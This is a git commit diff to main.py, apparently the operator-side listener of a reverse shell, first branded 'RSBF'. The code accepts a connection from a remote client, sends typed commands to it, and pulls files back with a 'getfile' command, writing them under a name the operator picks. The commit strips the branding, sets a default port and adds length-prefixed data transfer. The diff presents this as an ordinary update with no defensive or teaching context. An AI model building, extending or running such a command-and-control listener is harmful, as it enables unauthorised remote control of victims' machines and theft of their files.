b6e0fac5cf62292e2ca66b05705194345c822c65
InnsmouthFisherman <76620415+InnsmouthFisherman@users.noreply.github.com>
2026-08-19 05:15:31 +0500

    Update main.py

--- main.py
+++ main.py
@@ -2,49 +2,46 @@ import socket
 import sys
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-HOST = '127.0.0.1'
+hostname = socket.gethostname()
+HOST = socket.gethostbyname(hostname)
+print("name, host: ", hostname, HOST)
 
 try:
     PORT = int(sys.argv[1])
 except Exception as ex:
-    print('Usage: python3 main.py <port>\n' + str(ex))
-    sys.exit(1)
+    PORT = 8080
 
 
 def main():
     s.bind((HOST, PORT))
     s.listen(10)
-    print('RSBF server listening on port {}...'.format(PORT))
+    print('server listening on port {}...'.format(PORT))
 
     conn, _ = s.accept()
-
     while True:
-        cmd = input('RSBF> ').rstrip()
-
-        if cmd == '':
-            continue
-
+        cmd = input('> ').rstrip()
         conn.send(bytes(cmd, encoding="utf-8", errors="ignore"))
 
         if cmd == 'exit':
             s.close()
             sys.exit(0)
 
-        if cmd[:7] == "getfile":
-            f = open("FILENAME.txt", "wb")
-            while True:
-                data = conn.recv(4096)
-                print('reading data')
-                if not data:
-                    print('done')
-                    break
-                f.write(data)
-                print('writing data')
-            f.close()
-            print('Done sending\n')
+        elif cmd == 'ls' or cmd == 'cd':
+            data = recv_data(conn)
+            print(str(data, encoding="utf-8", errors="ignore"))
 
-        data = conn.recv(4096)
-        print(str(data, encoding="utf-8", errors="ignore"))
+        elif cmd[:7] == "getfile": 
+            f = open(cmd[8:], "w")
+            data = recv_data(conn).decode("utf-8")
+            f.write(data)
+            f.close()
+        else:
+            continue
+
+def recv_data(conn):
+    datalen = int.from_bytes(conn.recv(4), "big")
+    data = conn.recv(datalen)
+    return data
 
 
 if __name__ == '__main__':
